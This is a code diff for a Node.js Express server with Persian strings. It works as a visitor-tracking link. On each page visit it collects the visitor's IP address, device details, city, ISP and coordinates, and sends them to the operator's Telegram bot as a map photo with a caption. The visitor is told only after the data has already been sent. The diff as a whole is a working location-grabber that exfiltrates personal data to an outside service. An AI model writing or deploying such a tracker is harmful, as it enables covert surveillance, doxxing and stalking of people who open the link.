@@ -13,14 +13,13 @@ app.get('/', async (req, res) => {
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const userAgent = useragent.parse(req.headers['user-agent']);
 
-    // گرفتن موقعیت مکانی
     const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
     const { lat, lon, city, country, isp } = geoRes.data;
 
-    // ساخت آیدی یکتا
     const uniqueId = `${Date.now()}_${ip}`;
+    const mapImage = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=15&size=600x400&markers=${lat},${lon},red-pushpin`;
+    const mapLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=15/${lat}/${lon}`;
 
-    // متن کپشن
     const caption = `
 آیدی: ${uniqueId}
 IP: ${ip}
@@ -28,23 +27,17 @@ IP: ${ip}
 شهر: ${city}
 ISP: ${isp}
 دستگاه: ${userAgent.toString()}
+نقشه: ${mapLink}
     `;
 
-    // ارسال لوکیشن با کپشن
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`, {
+    // ارسال تصویر نقشه به تلگرام
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
       chat_id: CHAT_ID,
-      latitude: lat,
-      longitude: lon,
-      disable_notification: true
+      photo: mapImage,
+      caption
     });
 
-    // ارسال کپشن جداگانه
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: caption
-    });
-
-    res.send('<h2>موقعیت شما با موفقیت ارسال شد.</h2>');
+    res.send('<h2>نقشه دقیق شما ارسال شد (بدون کلید API)</h2>');
   } catch (error) {
     console.error(error);
     res.status(500).send('خطا در دریافت موقعیت یا ارسال به تلگرام');
@@ -52,5 +45,5 @@ ISP: ${isp}
 });
 
 app.listen(PORT, () => {
-  console.log(`Server is running on http://localhost:${PORT}`);
+  console.log(`Server running on http://localhost:${PORT}`);
 });
